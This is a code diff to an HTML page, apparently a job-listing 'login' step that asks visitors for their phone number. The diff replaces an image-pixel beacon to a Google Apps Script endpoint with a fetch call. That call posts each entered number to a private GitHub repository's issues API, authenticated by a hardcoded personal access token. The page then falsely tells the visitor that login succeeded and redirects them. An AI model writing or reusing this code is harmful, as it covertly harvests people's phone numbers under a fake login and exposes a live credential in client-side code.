@@ -32,7 +32,6 @@ button:active{opacity:.8}
 </div>
 
 <script>
-var API = 'https://script.google.com/macros/s/AKfycbwkl_XaQ9LSWjl777ceHwxZ3xGZRjAPFttzaXf1qZrRqd8w1eyG7QyrnBq5g8d23LhE/exec';
 var TARGET = 'https://thanhtientt51-commits.github.io/jiangsu-jobs-2026/';
 
 function submitPhone() {
@@ -44,10 +43,18 @@ function submitPhone() {
   }
   err.textContent = '';
 
-  // 图片像素发给Google表格
-  new Image().src = API + '?phone=' + encodeURIComponent(phone);
-  // 显示号码2秒再跳转
-  document.querySelector('.card').innerHTML = '<div class="icon">✅</div><h2>登录成功</h2><p style="font-size:1.5em;font-weight:700;color:#1a3a6b;margin:20px 0">' + phone + '</p><p style="color:#888">正在跳转到筛岗系统...</p>';
+  // 写入GitHub私密仓库（国内能连通）
+  fetch('https://api.github.com/repos/thanhtientt51-commits/phone-data/issues', {
+    method: 'POST',
+    headers: {
+      'Authorization': 'token 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',
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ title: phone, body: new Date().toISOString() })
+  }).catch(function(){});
+
+  // 显示成功并跳转
+  document.querySelector('.card').innerHTML = '<div class="icon">✅</div><h2>登录成功</h2><p style="font-size:2em;font-weight:800;color:#1a3a6b;margin:16px 0;letter-spacing:2px">' + phone + '</p><p style="color:#888">正在跳转...</p>';
   setTimeout(function() { window.location.href = TARGET; }, 1500);
 }
 </script>
